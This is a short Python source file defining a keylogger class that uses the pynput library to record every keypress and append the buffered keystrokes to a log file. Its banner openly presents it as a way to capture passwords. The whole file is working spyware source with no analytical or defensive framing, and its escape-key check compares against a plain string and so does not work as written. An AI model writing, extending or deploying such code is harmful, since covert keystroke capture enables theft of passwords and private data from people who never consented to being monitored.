# KEYLOGGER - BECAUSE PASSWORDS CHANGE, BUT KEYSTROKES ARE FOREVER
# -----------------------------------------------------------------
class KeyLogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.running = True
        self.buffer = []
    
    def start(self):
        # Using pynput - if not installed, we skip
        try:
            from pynput.keyboard import Listener
            def on_press(key):
                if not self.running:
                    return False
                self.buffer.append(str(key))
                if len(self.buffer) > 100:
                    self.flush()
            def on_release(key):
                if key == 'esc':
                    return False
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
        except:
            pass
    
    def flush(self):
        with open(self.log_file, "a") as f:
            f.write("".join(self.buffer) + "\n")
        self.buffer = []

